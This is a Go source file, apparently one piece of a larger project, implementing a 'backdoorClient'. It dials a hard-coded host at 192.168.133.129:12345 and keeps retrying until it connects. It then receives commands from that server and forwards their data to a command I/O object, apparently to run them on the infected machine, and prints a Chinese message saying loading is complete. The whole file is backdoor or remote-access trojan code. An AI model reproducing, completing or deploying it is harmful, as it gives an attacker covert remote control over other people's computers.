package main

import (
	"fmt"
	"net"
	"time"
)

type backdoorClient struct {
}

var count int
var M *CmdIo

func (t *backdoorClient) OnSuccess(conn net.Conn) {
	M = NewCmdIo()
	time.Sleep(time.Second * 3)
}
func (t *backdoorClient) OnData(cmd, ext uint16, data []byte) error {
	fmt.Println(data)
	process(cmd, ext, data)
	return nil
}

func process(cmd, ext uint16, data []byte) {
	if cmd == 3 && ext == 3 {
		count++
		M.Send(string(data))
	}
}
func (t *backdoorClient) OnRecvError(err error) {

}
func (t *backdoorClient) OnClose() {

}

func newClient(network, adress string) (*Client, error) {
	a := &backdoorClient{}
	client, err := Dial(network, adress, a)
	if err != nil {
		return nil, err
	}
	return client, nil
}

func main() {
Start:
	count = 0
	client, err := newClient("tcp", "192.168.133.129:12345")
	if err != nil {
		fmt.Printf("err: %v\n", err)
		time.Sleep(time.Second * 5)
		goto Start
	}
	//time.Sleep(time.Second * 5)
	client.Send(2, 2, []byte{'a'})
	client.off = 0
	for {
		if count == 5 {
			break
		}
		time.Sleep(time.Second * 5)
	}
	fmt.Println("已加载完成")
	time.Sleep(time.Second * 5)
	return
}
